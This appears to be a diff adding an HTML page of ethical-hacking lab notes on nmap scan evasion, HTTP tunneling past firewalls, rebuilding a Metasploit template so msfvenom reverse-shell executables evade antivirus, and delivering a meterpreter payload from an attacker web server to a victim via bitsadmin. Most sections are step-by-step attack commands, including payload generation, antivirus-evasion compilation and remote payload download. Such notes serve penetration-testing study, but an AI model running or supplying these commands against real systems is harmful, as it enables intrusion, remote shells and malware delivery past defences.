@@ -1,0 +1,49 @@
+<html>
+    <meta name=”robots” content=”noindex,nofollow”/>
+  <a href=../index.html>Back to home</a>
+<hr/>
+<h2>Nmap Evasion Techniques</h2>
+<p>First, try nmap 10.10.1.11</p>
+<p>If all 1000 scanned ports are in ignored state / filtered, we can try TCP SYN Port Scan.</p>
+<p>nmap -sS 10.10.1.11 -> same results</p>
+<p>INTENSE Scan: nmap -T4 -A 10.10.1.11</p>
+<p>T4: Aggressive (4) speeds scan; -A: enables OS detection, version detection, script scanning and traceroute.</p>
+<p>Still, results can be the same (no open ports); we can perform a Ping Sweep:</p>
+<p>nmap -sP 10.10.1.0/24</p>
+<p>From the scan result, we can see machines which are active (example: 10.10.1.19) and we can perform a <b>Zombie Scan</b>: </p>
+<p>nmap -sI 10.10.1.22 10.10.1.11</p>
+<p>The Zombie Scan will show that various ports and services are open !</p>
+
+  <h2>Bypass Firewall Rules using HTTP/FTP Tunneling</h2>
+  <p>HTTP tunneling technology allows attackers to perform various Internet tasks despite the restrictions imposed by firewalls. This method
+    can be implemented if the target company has a public web server with port 80 used for HTTP traffic that is unfiltered by its firewall. 
+    Many firewalls do not examine the payload of an HTTP packet to confirm that it's legit. Thus this is possible to tunnel traffic via TCP port 80.</p>
+    <p>The remote host method is capable of tunneling through any proxy. <a target=_blank href=https://targeted.org/htthost/>HTTPort</a> uses a special server software called <b>HTTHost</b>, installed outside the 
+    proxy-blocked network.</p>
+
+  <h2>Bypass Antivirus using Metasploit Templates</h2>
+  <p>msfvenom -p windows/shell_reverse_tcp lhost=10.10.1.13 lport=444 -f exe > /home/attacker/Windows.exe</p>
+  <p>Check the file with VirusTotal.com</p>
+  <p>After analysis the number of antivirus sites that have detected the virus is shown</p>
+  <p>Edit <b>template.c</b>b which can be found in /usr/share/metasploit-framework/data/templates/src/pe/exe </p>
+  <p>In line 3, change 4096 to 4000</p>
+  <p>i686-w64-mingw32-gcc template.c -lws2_32 -o evasion.exe</p>
+  <p>In a new terminal generate a payload using new template:</p>
+  <p>msfvenom -p windows/shell_reverse_tcp lhost=10.10.1.13 lport=444 -x /usr/share/metasploit-framework/data/templates/src/pe/exe/evasion.exe -f exe > /home/attacker/bypass.exe</p>
+  <p>Upload bypass.exe to VirusTotal.com</p>
+  <p>The detection by antivirus vendors should now be less !</p>
+
+  <h2>Bypass Firewall through Windows BITSAdmin</h2>
+  <p>Background Intelligent Transfer Service (BITS) is an essential component since Windows XP. </p>
+  <p>msfvenom -p windows/meterpreter/reverse_tcp lhost=10.10.1.13 lport=444 -f exe > /home/attacker/Exploit.exe</p>
+  <p>Share the payload with the target machine:</p>
+  <p>mkdir /var/www/html/share</p>
+  <p>chmod -R 755 /var/www/html/share</p>
+  <p>chown -R www-data:www-data /var/www/html/share</p>
+  <p>cp /home/attacker/Exploit.exe /var/www/html/share</p>
+  <p>service apache2 start</p>
+  <p>On the victim computer, start PowerShell</p>
+  <p>bitsadmin /transfer Exploit.exe http://10.10.1.13/share/Exploit.exe c:\Exploit.exe</p>
+  <p>BITSAdmin transfers the file</p>
+  <p>Compare this with downloading Exploit.exe from http://10.10.1.3/share with a web browser !</p>
+  <p>After transferring the malicious file the attacker can use this malicious file for gaining access, escalate privileges and to perform various malicious activities</p>
